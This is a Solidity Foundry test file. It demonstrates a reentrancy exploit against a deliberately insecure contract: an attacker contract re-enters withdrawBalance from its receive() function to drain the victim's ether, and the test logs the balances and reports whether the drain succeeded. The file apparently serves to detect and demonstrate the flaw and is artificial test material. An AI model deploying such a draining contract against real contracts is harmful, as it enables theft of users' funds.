// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/reentrancy_insecure.sol";

contract MaliciousContract {
    Reentrancy_insecure public victim;
    uint256 public reentrancyCount;
    uint256 public initialDeposit;

    constructor(address _victimAddress) payable {
        victim = Reentrancy_insecure(_victimAddress);
        initialDeposit = msg.value;
    }

    function deposit() external payable {
        victim.deposit{value: msg.value}();
    }

    function attack() external {
        victim.withdrawBalance();
    }

    receive() external payable {
        reentrancyCount++;
        if (address(victim).balance >= initialDeposit) {
            victim.withdrawBalance();
        }
    }
}

contract ReentrancyTest is Test {
    Reentrancy_insecure public victim;
    MaliciousContract public attacker;
    address public user = address(0x1);
    uint256 public initialBalance = 10 ether;

    function setUp() public {
        victim = new Reentrancy_insecure();
        vm.deal(user, initialBalance);

        vm.startPrank(user);
        attacker = new MaliciousContract{value: 1 ether}(address(victim));
        attacker.deposit{value: 1 ether}();
        vm.stopPrank();
    }

    function testReentrancyAttack() public {
        console.log("--- BEFORE-Trigger State ---");
        uint256 victimBalanceBefore = address(victim).balance;
        uint256 attackerBalanceBefore = address(attacker).balance;
        uint256 reentrancyCountBefore = attacker.reentrancyCount();
        console.log("Victim ETH balance:", victimBalanceBefore);
        console.log("Attacker ETH balance:", attackerBalanceBefore);
        console.log("Reentrancy Count:", reentrancyCountBefore);

        console.log("--- Trigger Attack ---");
        vm.prank(user);
        attacker.attack();

        console.log("--- AFTER-Trigger State ---");
        uint256 victimBalanceAfter = address(victim).balance;
        uint256 attackerBalanceAfter = address(attacker).balance;
        uint256 reentrancyCountAfter = attacker.reentrancyCount();
        console.log("Victim ETH balance:", victimBalanceAfter);
        console.log("Attacker ETH balance:", attackerBalanceAfter);
        console.log("Reentrancy Count:", reentrancyCountAfter);

        uint256 victimLoss = victimBalanceBefore - victimBalanceAfter;
        uint256 attackerGain = attackerBalanceAfter - attackerBalanceBefore;
        uint256 reentrancyTimes = reentrancyCountAfter - reentrancyCountBefore;
        console.log("Victim balance drained:", victimLoss);
        console.log("Attacker profit:", attackerGain);
        console.log("Reentrancy occurred times:", reentrancyTimes);

        bool victimDrained = (victimBalanceAfter == 0);
        bool attackerProfit = (attackerGain > 0);
        bool reentrancyHappened = (reentrancyTimes > 0);
        bool vulnerabilityExists = victimDrained && attackerProfit && reentrancyHappened;

        if (vulnerabilityExists) {
            console.log("Vulnerability Exist: Successfully drained funds via reentrancy attack");
        } else {
            console.log("Vulnerability not Exist: Failed to exploit reentrancy vulnerability");
        }
    }
}